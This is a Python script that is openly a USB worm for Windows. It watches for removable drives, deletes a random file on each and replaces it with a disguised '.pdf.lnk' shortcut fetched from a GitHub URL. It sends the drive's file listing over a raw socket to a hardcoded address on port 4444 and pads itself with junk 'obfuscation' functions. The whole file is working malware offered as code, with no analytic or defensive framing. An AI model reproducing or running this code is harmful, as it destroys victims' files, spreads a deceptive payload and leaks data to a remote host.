import requests
import os
import sys
import time
import psutil
import random
import socket
import threading

path = r"C:\Windows"
ip = "192.168.178.200"
port = 4444

def timestoper():
    time.sleep(100)
    sys.exit(1)

def randomranderuhe():
    print("first obf nothing found")
    rhgurwuihwr = random.randint(1, 100000)
    gwrhouwruihogwr = random.randint(1, 100000000)
    hwruwrhwhwr = gwrhouwruihogwr + rhgurwuihwr
    enthetjej = random.randint(1, 10000000)

def secondobf():
    print("second obf nothing found")
    i = 1
    while i < 10:
        numo = random.randint(1, 10000)
        numb = random.randint(1, 19999)
        nomt = numb + numb
        i += 1

def thirdobf():
    print("third obf nothing found")
    enhenhiet = random.randint(1, 3235623)
    grwbgriwrw  = random.randint(1, 24895942)
    rwbibwrbw = grwbgriwrw + enhenhiet


def checkusb():
    print("checking...")
    usbs = []
    partitions = psutil.disk_partitions(all=False)
    for p in partitions:
        if 'removable' in p.opts or p.device.startswith(('E:', 'F:', 'G:', 'H:')):
            usbs.append(p)
            print(f"found usb {p}")
    return usbs
    

def findusbinf():
    print("finding usbs")
    while True:
        try:
            time.sleep(random.randint(1, 20))
            usbs = checkusb()
            if len(usbs) == 0:
                print("bwwrbhwrhhwrh")
                option = random.randint(1, 3)
                if option == 1:
                    randomranderuhe()
                    findusbinf()
                elif option == 2:
                    secondobf()
                    findusbinf()
                elif option == 3:
                    thirdobf()
                    findusbinf()
            for usb in usbs:
                mount = usb.mountpoint
                try:
                    spreadthroughusb(mount)
                    os.chdir(mount)
                    filenames = os.listdir()
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, port))
                    for file in filenames:
                        try:
                            s.send(file.encode())
                            print("[!] Sended file name")
                        except Exception as e:
                            print(f"{e}")
                except Exception as e:
                    print(f"{e}")
        except Exception as e:
            print(f"{e}")

def spreadthroughusb(mount):
    time.sleep(random.randint(3, 10))
    urldownload = "https://github.com/Guithub12/etjtejetj/raw/refs/heads/main/test.pdf.lnk"
    os.chdir(mount)
    randomfile = os.listdir()
    if not randomfile or randomfile == "System Volume Information":
        try:
            print("[!] No file found, creating one...")
            new_file_name = "Payments.pdf.lnk"
            with requests.get(urldownload, stream=True) as r:
                r.raise_for_status()
                with open(new_file_name, "wb") as f:
                    for chunk in r.iter_content(chunk_size=8192):
                        if chunk:
                            f.write(chunk)
        except Exception as e:
            print(f"{e}")
    randomfilechose = random.choice(randomfile)
    print(f"The random file name is {randomfilechose}")
    os.remove(randomfilechose)
    with requests.get(urldownload, stream=True) as r:
        r.raise_for_status()
        removedot = os.path.splitext(randomfilechose)[0]
        addextention = removedot +".pdf.lnk"
        with open(addextention, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        print("Wrote file and replaced old file")







def main():
    threading.Thread(target=findusbinf).start()
    threading.Thread(target=timestoper).start()

if __name__ == "__main__":
    main()